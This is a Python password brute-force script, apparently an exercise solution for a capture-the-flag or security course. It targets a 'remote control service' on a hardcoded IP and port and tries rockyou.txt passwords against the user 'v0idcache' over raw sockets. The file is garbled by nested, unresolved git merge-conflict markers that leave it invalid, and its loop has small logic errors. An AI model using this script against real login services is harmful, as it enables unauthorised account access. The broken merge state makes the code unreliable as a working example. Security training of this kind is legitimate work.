"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket

<<<<<<< HEAD
<<<<<<< HEAD
host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "rockyou.txt" # Point to wordlist file; had to download because currently having issues with VM
=======
host = "" # IP address here
port = 0000 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
>>>>>>> upstream/master
=======
host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "rockyou.txt" # Point to wordlist file; had to download because currently having issues with VM
>>>>>>> 145c3c6bcd28ed7c68034266714738d438eed305

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """

<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> 145c3c6bcd28ed7c68034266714738d438eed305
    f = open(wordlist, 'r')
    user = "v0idcache"
    password = f.readline()
    test = "Fail\n"


    while test == "Fail\n":
        line = f.readline()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        print(s.recv(1024))
        print(user)
        s.send(user+"\n")
        print(s.recv(1024))
        print(line)
        s.send(line + "\n")
        test = s.recv(1024)
        print(test)
        s.close()

            
<<<<<<< HEAD
=======
    username = ""   # Hint: use OSINT
    password = ""   # Hint: use wordlist
>>>>>>> upstream/master
=======
>>>>>>> 145c3c6bcd28ed7c68034266714738d438eed305




if __name__ == '__main__':
    brute_force()
